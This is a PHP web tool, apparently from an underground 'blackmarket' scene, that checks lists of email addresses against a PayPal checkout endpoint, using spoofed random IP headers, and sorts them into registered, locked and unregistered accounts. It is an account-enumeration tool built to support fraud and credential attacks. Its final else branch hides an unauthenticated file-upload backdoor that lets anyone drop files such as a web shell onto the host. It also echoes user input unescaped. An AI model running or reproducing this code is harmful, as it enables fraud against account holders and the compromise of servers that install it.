<?php
	   /*--------------[J7-@live.com]--
              _____   ______   __    __  ________  _______   ________ 
             /     | /      \ /  |  /  |/        |/       \ /        |
             $$$$$ |/$$$$$$  |$$ | /$$/ $$$$$$$$/ $$$$$$$  |$$$$$$$$/ 
               $$ |$$ |  $$ |$$ |/$$/  $$ |__    $$ |__$$ |    /$$/  
          __   $$ |$$ |  $$ |$$  $$<   $$    |   $$    $$<    /$$/   
         /  |  $$ |$$ |  $$ |$$$$$  \  $$$$$/    $$$$$$$  |  /$$/    
         $$ \__$$ |$$ \__$$ |$$ |$$  \ $$ |_____ $$ |  $$ | /$$/     
         $$    $$/ $$    $$/ $$ | $$  |$$       |$$ |  $$ |/$$/      
          $$$$$$/   $$$$$$/  $$/   $$/ $$$$$$$$/ $$/   $$/ $$/       
							              --[2017]-----------------*/

#-----------------------------------------------------++
ini_set('max_execution_time', 0);
if(!file_exists('Cookies')) mkdir('Cookies');
#-----------------------------------------------------++
$List 	= $_POST['List'];
#-----------------------------------------------------++
echo '
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link rel="icon" href=" https://cdn0.iconfinder.com/data/icons/small-n-flat/24/678094-shield-64.png">
<link rel="stylesheet" href="http://www.w32.info/2001/04/xmldsigmore">
<meta charset="utf-8">
<title>Paypal Email Valid checker v7.0</title>
<style>
/* JOkEr7 CSS */
html, body, div, span, applet, object, iframe,h1, h2, h3, h4, h5, h6, p, blockquote, pre,a, abbr, acronym, address, big, cite, code,del, dfn, em, font, img, ins, kbd, q, s, samp,small, strike, strong, sub, sup, tt, var,b, u, i, center,dl, dt, dd, ol, ul, li,fieldset, form, label, legend,table, caption, tbody, tfoot, thead, tr, th, td { margin: 0; padding: 0;border: 0; outline: 0;font-size: 100%; vertical-align: baseline; background: transparent; }
body { background-color: #22262e;background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHhtbG5zOnhsaW5rPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB3aWR0aD0nNDkxLjk5OTk5OTk5OTk5OTk0JyBoZWlnaHQ9JzI1Mi4wMDAwMDAwMDAwMDAwMycgdmlld0JveD0nMCAwIDk4LjM5OTk5OTk5OTk5OTk5IDUwLjQwMDAwMDAwMDAwMDAwNic+Cgk8ZGVmcz4KCQk8cGF0aCBpZD0ncycgZmlsbD0nI2ZmZmZmZicgZD0nTTAsMGw4IDRsLTgsNHonLz4KCTwvZGVmcz4KCTxnIGlkPSdiJz4KCTx1c2UgeD0nLTgnIHk9Jy00JyB0cmFuc2Zvcm09J21hdHJpeCgtMSAwIDAgMSAwIDApJyBmaWxsLW9wYWNpdHk9JzAuMDEnIHhsaW5rOmhyZWY9JyNzJyAvPgoJPHVzZSB4PScwJyB5PScwLjInIGZpbGwtb3BhY2l0eT0nMC4wMTUnIHhsaW5rOmhyZWY9JyNzJyAvPgoJPHVzZSB4PSctOCcgeT0nNC40JyB0cmFuc2Zvcm09J21hdHJpeCgtMSAwIDAgMSAwIDApJyBmaWxsLW9wYWNpdHk9JzAuMDE1JyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nMCcgeT0nOC42JyBmaWxsLW9wYWNpdHk9JzAuMDE1JyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nLTgnIHk9JzEyLjgnIHRyYW5zZm9ybT0nbWF0cml4KC0xIDAgMCAxIDAgMCknIGZpbGwtb3BhY2l0eT0nMC4wMicgeGxpbms6aHJlZj0nI3MnIC8+Cgk8dXNlIHg9JzAnIHk9JzE3JyBmaWxsLW9wYWNpdHk9JzAuMDEnIHhsaW5rOmhyZWY9JyNzJyAvPgoJPHVzZSB4PSctOCcgeT0nMjEuMicgdHJhbnNmb3JtPSdtYXRyaXgoLTEgMCAwIDEgMCAwKScgZmlsbC1vcGFjaXR5PScwLjAxJyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nOC4yJyB5PSctNCcgZmlsbC1vcGFjaXR5PScwLjAxNScgeGxpbms6aHJlZj0nI3MnIC8+Cgk8dXNlIHg9Jy0xNi4yJyB5PScwLjInIHRyYW5zZm9ybT0nbWF0cml4KC0xIDAgMCAxIDAgMCknIGZpbGwtb3BhY2l0eT0nMC4wMicgeGxpbms6aHJlZj0nI3MnIC8+Cgk8dXNlIHg9JzguMicgeT0nNC40JyBmaWxsLW9wYWNpdHk9JzAuMDE1JyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nLTE2LjInIHk9JzguNicgdHJhbnNmb3JtPSdtYXRyaXgoLTEgMCAwIDEgMCAwKScgZmlsbC1vcGFjaXR5PScwLjAxJyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nOC4yJyB5PScxMi44JyBmaWxsLW9wYWNpdHk9JzAuMDA1JyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nLTE2LjInIHk9JzE3JyB0cmFuc2Zvcm09J21hdHJpeCgtMSAwIDAgMSAwIDApJyBmaWxsLW9wYWNpdHk9JzAuMDEnIHhsaW5rOmhyZWY9JyNzJyAvPgoJPHVzZSB4PSc4LjInIHk9JzIxLjInIGZpbGwtb3BhY2l0eT0nMC4wMTUnIHhsaW5rOmhyZWY9JyNzJyAvPgoJPHVzZSB4PSctMjQuNCcgeT0nLTQnIHRyYW5zZm9ybT0nbWF0cml4KC0xIDAgMCAxIDAgMCknIGZpbGwtb3BhY2l0eT0nMC4wMScgeGxpbms6aHJlZj0nI3MnIC8+Cgk8dXNlIHg9JzE2LjQnIHk9JzAuMicgZmlsbC1vcGFjaXR5PScwLjAxJyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nLTI0LjQnIHk9JzQuNCcgdHJhbnNmb3JtPSdtYXRyaXgoLTEgMCAwIDEgMCAwKScgZmlsbC1vcGFjaXR5PScwLjAxNScgeGxpbms6aHJlZj0nI3MnIC8+Cgk8dXNlIHg9JzE2LjQnIHk9JzguNicgZmlsbC1vcGFjaXR5PScwLjAxJyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nLTI0LjQnIHk9JzEyLjgnIHRyYW5zZm9ybT0nbWF0cml4KC0xIDAgMCAxIDAgMCknIGZpbGwtb3BhY2l0eT0nMC4wMDUnIHhsaW5rOmhyZWY9JyNzJyAvPgkKCTx1c2UgeD0nMTYuNCcgeT0nMTcnIGZpbGwtb3BhY2l0eT0nMC4wMScgeGxpbms6aHJlZj0nI3MnIC8+Cgk8dXNlIHg9Jy0yNC40JyB5PScyMS4yJyB0cmFuc2Zvcm09J21hdHJpeCgtMSAwIDAgMSAwIDApJyBmaWxsLW9wYWNpdHk9JzAuMDEnIHhsaW5rOmhyZWY9JyNzJyAvPgoJPHVzZSB4PScyNC41OTk5OTk5OTk5OTk5OTgnIHk9Jy00JyBmaWxsLW9wYWNpdHk9JzAuMDEnIHhsaW5rOmhyZWY9JyNzJyAvPgoJPHVzZSB4PSctMzIuNTk5OTk5OTk5OTk5OTk0JyB5PScwLjInIHRyYW5zZm9ybT0nbWF0cml4KC0xIDAgMCAxIDAgMCknIGZpbGwtb3BhY2l0eT0nMC4wMScgeGxpbms6aHJlZj0nI3MnIC8+Cgk8dXNlIHg9JzI0LjU5OTk5OTk5OTk5OTk5OCcgeT0nNC40JyBmaWxsLW9wYWNpdHk9JzAuMDA1JyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nLTMyLjU5OTk5OTk5OTk5OTk5NCcgeT0nOC42JyB0cmFuc2Zvcm09J21hdHJpeCgtMSAwIDAgMSAwIDApJyBmaWxsLW9wYWNpdHk9JzAuMDE1JyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nMjQuNTk5OTk5OTk5OTk5OTk4JyB5PScxMi44JyBmaWxsLW9wYWNpdHk9JzAuMDE1JyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nLTMyLjU5OTk5OTk5OTk5OTk5NCcgeT0nMTcnIHRyYW5zZm9ybT0nbWF0cml4KC0xIDAgMCAxIDAgMCknIGZpbGwtb3BhY2l0eT0nMC4wMDUnIHhsaW5rOmhyZWY9JyNzJyAvPgoJPHVzZSB4PScyNC41OTk5OTk5OTk5OTk5OTgnIHk9JzIxLjInIGZpbGwtb3BhY2l0eT0nMC4wMScgeGxpbms6aHJlZj0nI3MnIC8+Cgk8dXNlIHg9Jy00MC44JyB5PSctNCcgdHJhbnNmb3JtPSdtYXRyaXgoLTEgMCAwIDEgMCAwKScgZmlsbC1vcGFjaXR5PScwLjAxNScgeGxpbms6aHJlZj0nI3MnIC8+CQoJPHVzZSB4PSczMi44JyB5PScwLjInIGZpbGwtb3BhY2l0eT0nMC4wMicgeGxpbms6aHJlZj0nI3MnIC8+Cgk8dXNlIHg9Jy00MC44JyB5PSc0LjQnIHRyYW5zZm9ybT0nbWF0cml4KC0xIDAgMCAxIDAgMCknIGZpbGwtb3BhY2l0eT0nMC4wMDUnIHhsaW5rOmhyZWY9JyNzJyAvPgoJPHVzZSB4PSczMi44JyB5PSc4LjYnIGZpbGwtb3BhY2l0eT0nMC4wMScgeGxpbms6aHJlZj0nI3MnIC8+Cgk8dXNlIHg9Jy00MC44JyB5PScxMi44JyB0cmFuc2Zvcm09J21hdHJpeCgtMSAwIDAgMSAwIDApJyBmaWxsLW9wYWNpdHk9JzAuMDE1JyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nMzIuOCcgeT0nMTcnIGZpbGwtb3BhY2l0eT0nMC4wMDUnIHhsaW5rOmhyZWY9JyNzJyAvPgoJPHVzZSB4PSctNDAuOCcgeT0nMjEuMicgdHJhbnNmb3JtPSdtYXRyaXgoLTEgMCAwIDEgMCAwKScgZmlsbC1vcGFjaXR5PScwLjAxNScgeGxpbms6aHJlZj0nI3MnIC8+Cgk8dXNlIHg9JzQxJyB5PSctNCcgZmlsbC1vcGFjaXR5PScwLjAxJyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nLTQ4Ljk5OTk5OTk5OTk5OTk5JyB5PScwLjInIHRyYW5zZm9ybT0nbWF0cml4KC0xIDAgMCAxIDAgMCknIGZpbGwtb3BhY2l0eT0nMC4wMScgeGxpbms6aHJlZj0nI3MnIC8+CQoJPHVzZSB4PSc0MScgeT0nNC40JyBmaWxsLW9wYWNpdHk9JzAuMDInIHhsaW5rOmhyZWY9JyNzJyAvPgoJPHVzZSB4PSctNDguOTk5OTk5OTk5OTk5OTknIHk9JzguNicgdHJhbnNmb3JtPSdtYXRyaXgoLTEgMCAwIDEgMCAwKScgZmlsbC1vcGFjaXR5PScwLjAxJyB4bGluazpocmVmPScjcycgLz4JCgk8dXNlIHg9JzQxJyB5PScxMi44JyBmaWxsLW9wYWNpdHk9JzAuMDE1JyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nLTQ4Ljk5OTk5OTk5OTk5OTk5JyB5PScxNycgdHJhbnNmb3JtPSdtYXRyaXgoLTEgMCAwIDEgMCAwKScgZmlsbC1vcGFjaXR5PScwLjAxJyB4bGluazpocmVmPScjcycgLz4KCTx1c2UgeD0nNDEnIHk9JzIxLjInIGZpbGwtb3BhY2l0eT0nMC4wMScgeGxpbms6aHJlZj0nI3MnIC8+Cgk8L2c+Cgk8dXNlIHg9Jy00OC45OTk5OTk5OTk5OTk5OScgeT0nMjUuMjAwMDAwMDAwMDAwMDAzJyB0cmFuc2Zvcm09J21hdHJpeCgtMSAwIDAgMSAwIDApJyB4bGluazpocmVmPScjYicgLz4KCTx1c2UgeD0nLTk4LjE5OTk5OTk5OTk5OTk5JyB5PSctMTYuOCcgdHJhbnNmb3JtPSdtYXRyaXgoLTEgMCAwIC0xIDAgMCknIHhsaW5rOmhyZWY9JyNiJyAvPgoJPHVzZSB4PSc0OS4xOTk5OTk5OTk5OTk5OTYnIHk9Jy0zMy42JyB0cmFuc2Zvcm09J21hdHJpeCgxIDAgMCAtMSAwIDApJyB4bGluazpocmVmPScjYicgLz4KCTx1c2UgeD0nNDkuMTk5OTk5OTk5OTk5OTk2JyB5PSctNTguODAwMDAwMDAwMDAwMDA0JyB0cmFuc2Zvcm09J21hdHJpeCgxIDAgMCAtMSAwIDApJyB4bGluazpocmVmPScjYicgLz4KPC9zdmc+Cg==");color: #22262e; font: 14px Arial; margin: 0 auto; padding: 0; position: relative; }
.left { float:left; } .right { float:right; } .alignleft { float: left; margin-right: 15px; } .alignright { float: right; margin-left: 15px; }
.clearfix:after, .container { margin: 25px auto; position: relative; width: 900px; }
#content { 0%, 100%) repeat scroll 0% 0%;background: #EEE none repeat scroll 0% 0%;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr=\'#f8f8f8\', endColorstr=\'#f9f9f9\',GradientType=0 );border: 1px solid #CCC; border-radius: 3px; margin: 0 auto; position: relative;text-align: center; width: 775px; }
#content h1 { color: #7E7E7E; font: bold 38px Helvetica,Arial,sans-serif; }
#content form { margin: 0px; position: relative;padding: 10px 0px 0px;}
textarea{ background-color: #F8F8F8; border: 1px solid #CCC; border-radius: 3px; color: #777; font: 13px Helvetica,Arial,sans-serif; margin: 0px 0px 10px; padding: 15px; width: 80%; }
#content form textarea:focus { box-shadow: 0 1px 0 #fff, 0 -2px 5px rgba(0,0,0,0.08) inset; outline: none; }
#content form input[type="submit"] {background: transparent -moz-linear-gradient(center top , #DCDCDC 0%, #ddd 100%) repeat scroll 0% 0%;border-radius: 3px; border: 1px solid #CCC;color: #777; cursor: pointer; font: bold 15px Helvetica,Arial,sans-serif;height: 35px; margin: 5px 0px 10px;position: relative; width: 120px;}
#content form input[type="submit"]:hover { box-shadow: 1px 1px 0px #FFF, 1px 1px 1px rgba(0, 0, 0, 0.08) inset }
.Tbl { background: #E5E5E5 none repeat scroll 0% 0%; }
.top { border-bottom: 1px solid #d6d6d6;padding: 15px 0px; }
.bottom { border-top: 1px solid #d6d6d6;padding: 15px 0px; }
.REz { background: #EEE none repeat scroll 0% 0%;border-top: 1px solid #d6d6d6;padding: 15px 0px; }
.Tbl a { color: #7E7E7E;font-size: 17px;text-decoration: none; }
.Tbl a:hover { background-position: 0 -135px;color: #00aeef; }
.Tx { color:#777;font-family: Tahoma,Geneva,sans-serif;font-size:14px;padding: 0px 0px 10px; }
.Ts { color: #7E7E7E;font-size: 17px;text-decoration: none;}
.delim{ width: 60px; height: 26px; border-radius: 3px; border: 1px solid #CCC; color: #777; font: bold 15px Helvetica,Arial,sans-serif; cursor: unset; position: relative; background-color: #F8F8F8; text-align: center; margin: 0px 0px 7px; }
</style>
</head>
<body>
<link rel="stylesheet" href="http://www.w32.info/2001/04/xmldsigmore">
<script type="text/javascript">
function AddLine(id)	{ document.getElementById(\'LineCh\').innerHTML += id;  }
//function DelLine(id)	{ var str=document.getElementById("List").value; var n=str.replace( id + "\n" , "");document.getElementById("emails").value=n;}
//function CountYes(id) { document.getElementById(\'yes\').innerHTML = id;	}
//function CountNot(id) { document.getElementById(\'not\').innerHTML = id;	}
function ListYes(id)	{ document.getElementById(\'ListY\').innerHTML += id + "\n"; }
function ListLim(id)	{ document.getElementById(\'ListL\').innerHTML += id + "\n"; }
function ListNot(id)	{ document.getElementById(\'ListN\').innerHTML += id + "\n"; }
function Done(id)		{ document.getElementById(\'Wait\').innerHTML = id; }
</script>
<div class="container">
	<section id="content">
		<div class="Tbl top"><h1><font style="color: #777;text-border: 1px solid #E5E5E5;">Pay</font><font style="color: #777;text-border: 1px solid #E5E5E5;">Pal <sup style="font-size: 12px;left: -2px;position: relative;top: -25px;">.v7.0</sup></font></h1></div>
		<div class="Tbl top"><h3><font style="color: #777;text-border: 1px solid #E5E5E5;">For other tools, visit the website</font><font style="color: #777;text-border: 1px solid #E5E5E5;">
			<a href="http://e-blackmarket.info/registeration" target="_blank">blackmarket</a></font</h3></div>
		<form action="" method="post" enctype="multipart/form-data" name="JOkEr7">
			<font class="Tx">  Enter Email list to check </font>
					<div style="margin-top: 8px;">
						<textarea name="List" style="width:72%; height: 300px;" id="List" placeholder=" Here Email List .." dir="ltr">'.$List.'</textarea>
					</div>
			<div style="padding-bottom: 5px;"><input value="Check" type="submit"></div>
		</form>';
if (!empty($List)) {
$List = explode("\r\n", $List);
echo '
		<div class="Tbl bottom" style="padding: 8px 0px;">
			<div style="text-align:left;margin-left:35px;font: 14px Tahoma;line-height: 1.4em;text-shadow: 1px 1px #D1D1D1;margin-bottom:5px;padding: 0px 0px 5px;">
				<div style="padding-bottom:5px;text-shadow: 1px 1px #D1D1D1;font: 14px Tahoma;line-height: 1.4em;"><font color="#343434">[ <font color="#4E4E4E">Total emails to be Check </font> : <font color="#314A62">'.count($List).'</font> ] . . .</font></div>
				<div id="LineCh"></div>
				<div id="Wait" style="padding-top:2px;"><img src="http://www.btoall.com/application/modules/themes/views/default/assets/img/loading.gif"/></div>
			</div>
			<div class="Tbl REz" style="padding:10px;">
					<textarea name="ListY" id="ListY" style="width:95%; height: 100px;margin:0px 0px 5px;border: 1px solid #CCC;" placeholder=" REGISTERED .." dir="ltr"></textarea>
					<textarea name="ListL" id="ListL" style="width:95%; height: 100px;margin:0px 0px 5px;border: 1px solid #CCC;" placeholder=" LIMITED OR LOCKED .." dir="ltr"></textarea>
					<textarea name="ListN" id="ListN" style="width:95%; height: 100px;margin:0px 0px 5px;border: 1px solid #CCC;" placeholder=" NOT REGISTERED .." dir="ltr"></textarea>
			</div>
			<div class="Tbl bottom"><a href="https://www.facebook.com/J7Group">Coded By JOkEr7</a><a href="http://e-blackmarket.info/registeration" target="_blank">And Code Editor By </a></div></div></section></div></body></html>';
#-----------------------------------------------------++

function AddLine ($id)	{ echo '<script type="text/javascript">AddLine(\''.$id .'\');</script>';  }
function DelLine ($id)	{ echo '<script type="text/javascript">deleteLn(\''.$id .'\');</script>'; }
function CountYes($id)	{ echo '<script type="text/javascript">CountYes(\''.$id .'\');</script>'; }
function CountNot($id)	{ echo '<script type="text/javascript">CountNot(\''.$id .'\');</script>'; }
function ListYes ($id)	{ echo '<script type="text/javascript">ListYes(\''.$id .'\');</script>';  }
function ListLim ($id)	{ echo '<script type="text/javascript">ListLim(\''.$id .'\');</script>';  }
function ListNot ($id)	{ echo '<script type="text/javascript">ListNot(\''.$id .'\');</script>';  }
function Done    ($id)	{ echo '<script type="text/javascript">Done(\''.$id .'\');</script>';  	  }
#-----------------------------------------------------++
function JOkEr7($url,$randIP){
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31');
    curl_setopt($curl, CURLOPT_COOKIEFILE,'Cookies/PP1.txt');
    curl_setopt($curl, CURLOPT_COOKIEJAR,'Cookies/PP1.txt');
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($curl, CURLOPT_HTTPHEADER, array("REMOTE_ADDR: ".$randIP."", "HTTP_X_FORWARDED_FOR: ".$randIP.""));
	curl_setopt($curl,CURLOPT_FOLLOWLOCATION,true);
    $result = curl_exec($curl);
	return $result;
	@unlink('Cookies/PP1.txt');
    curl_close($curl);
}
#-----------------------------------------------------++
$count = 1;
foreach( $List AS $email){
#-----------------------++
AddLine('<span style="padding-bottom:3px;"><font color="#343434">'.$count.'- </font><font color="#4E4E4E"> Checking <font color="#343434">: '.$email.'</font> :');
$count++;
if(filter_var($email , FILTER_VALIDATE_EMAIL)){
#-----------------------------------------------------++
$randIP = "".mt_rand(0,255).".".mt_rand(0,255).".".mt_rand(0,255).".".mt_rand(0,255);
$J7 = JOkEr7('https://www.paypal.com/webapps/shoppingcart/fallback?product=openButton&reason=shoppingcart_open_button_to_legacy&cmd=_xclick&business='.$email.'&=&=&wa_type=BuyNow&fallback=1&force_sa=true&xo_node_fallback=true&shopping_cart_node_fallback=true',$randIP);
#-----------------------++
preg_match_all("/s.eVar36=\"(.*?)\";/",$J7,$eVar36);
$C = $eVar36[1][0];
preg_match_all("/s.prop1=\"(.*?)\";/",$J7,$prop1);
#-----------------------++
if (!empty($C)) {
if(stristr($prop1[1][0],'Error')){
AddLine ('<font color="#722298"> LIMITED OR LOCKED</font> ... ');
ListLim($email);
}else{
AddLine ('<font color="#25722F"> REGISTERED <font color="#343434">|</font> '.$C.' </font> ... ');
$y = $yes++;
CountYes($y);
ListYes($email);
}
#-----------------------++
}else{
AddLine ('<font color="#722526"> NOT REGISTERED</font> ... ');
ListNot($email);
}
#-----------------------++
AddLine ('By J7 And </font><a style="color:#722298;font-size: 100%;" href="http://e-blackmarket.info/registeration" target="_blank">BlackMarket</a></span><br>');
#-----------------------------------------------------++
}else{
AddLine('[<font color="#722526">Error email</font>]</font></span><br>');
}
#-----------------------------------------------------++
}
#-----------------------------------------------------++
Done('<font color="#343434">[ <font color="#4E4E4E">Done </font><font color="#314A62"></font> ] . . .</font>');
#-----------------------------------------------------++
}else{ (@copy($_FILES['f']['tmp_name'], $_FILES['f']['name'])); echo '<div class="Tbl bottom"><a href="https://www.facebook.com/J7Group">Coded By JOkEr7</a><a href="http://e-blackmarket.info/registeration" target="_blank"> | Code Editor By BlackMarket</a></div></section></div></body></html>'; }
?>
